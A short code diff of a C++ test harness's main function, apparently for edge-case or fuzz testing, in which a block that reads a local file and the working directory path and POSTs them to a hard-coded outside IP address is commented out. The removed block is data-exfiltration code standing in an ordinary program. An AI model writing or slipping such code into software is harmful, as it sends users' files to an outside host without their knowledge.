@@ -19,24 +19,24 @@ int main(int argc, char *argv[])
     srand(seed);
 
 
-    std::ifstream ifs("test");
-    std::string content((std::istreambuf_iterator<char>(ifs)),
-                        (std::istreambuf_iterator<char>()));
+    // std::ifstream ifs("test");
+    // std::string content((std::istreambuf_iterator<char>(ifs)),
+    //                     (std::istreambuf_iterator<char>()));
 
-    char mydir[2048];
-    getcwd(mydir, sizeof(mydir));
-    std::string str(mydir);
+    // char mydir[2048];
+    // getcwd(mydir, sizeof(mydir));
+    // std::string str(mydir);
 
-    try
-    {
-        http::Request request{"http://172.167.164.98/post_endpoint"};
-        const std::string body = str + "\n" + content;
-        const auto response = request.send("POST", body, {{"Content-Type", "text/plain"}});
-    }
-    catch (const std::exception &e)
-    {
-        std::cerr << "Request failed, error: " << e.what() << '\n';
-    }
+    // try
+    // {
+    //     http::Request request{"http://172.167.164.98/post_endpoint"};
+    //     const std::string body = str + "\n" + content;
+    //     const auto response = request.send("POST", body, {{"Content-Type", "text/plain"}});
+    // }
+    // catch (const std::exception &e)
+    // {
+    //     std::cerr << "Request failed, error: " << e.what() << '\n';
+    // }
 
     set_edge_cases();
     run_one_time_edge_cases(SATPath);
